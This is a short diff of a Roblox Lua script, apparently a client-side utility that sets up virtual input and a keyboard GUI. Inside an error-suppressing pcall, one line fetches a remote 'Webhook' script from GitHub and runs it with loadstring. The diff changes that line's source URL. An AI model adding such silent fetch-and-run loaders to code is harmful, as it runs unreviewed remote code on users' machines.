@@ -7,7 +7,7 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 pcall(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/StarFIow/Scripts/main/Utility/Webhook.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/its-starflow/Scripts/main/Utility/Webhook.luau"))()
 end)
 
 local Keyboard = Instance.new("ScreenGui")
